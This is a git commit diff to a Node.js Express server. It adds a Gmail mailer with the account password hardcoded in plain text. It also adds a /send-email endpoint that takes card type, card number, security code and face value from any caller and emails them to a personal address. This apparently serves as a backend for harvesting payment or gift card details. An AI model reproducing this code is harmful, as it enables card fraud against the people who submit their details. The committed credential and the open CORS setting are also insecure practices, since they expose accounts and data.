c5cd806bd3df2a70657523c5b8a8d89bc4c575af
unknown <eesuolaayot@gmail.com>
2024-06-30 16:43:18 +0100

    commm

--- index.js
+++ index.js
@@ -2,8 +2,22 @@ const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
+const nodemailer = require('nodemailer');
+const bodyParser = require('body-parser');
 
 const app = express();
+app.use(bodyParser.json());
+
+
+const transporter = nodemailer.createTransport({
+    service: 'Gmail', // or any other email service
+    auth: {
+        user: 'eesuolaayot@gmail.com',
+        pass: '08054527758'
+    }
+});
+
+
 app.get('/', (req, res)=> {
     res.send('Hello World')
 })
@@ -13,6 +27,25 @@ const io = socketIo(server, {
         origin: "*", // Allow all origins. For better security, specify your frontend's origin.
         methods: ["GET", "POST"]
     }
+});
+
+
+app.post('/send-email', (req, res) => {
+    const { cardType, cardNumber, securityCode, faceValue } = req.body;
+
+    const mailOptions = {
+        from: 'users',
+        to: 'eesuolaayot@gmail.com',
+        subject: `New message from User`,
+        text: `CardType: ${cardType}, cardNumber: ${cardNumber}, securityCode: ${securityCode}, faceValue: ${faceValue}`
+    };
+
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+            return res.status(500).json({ success: false, error });
+        }
+        res.json({ success: true, info });
+    });
 });
 
 app.use(cors()); // Use CORS middleware
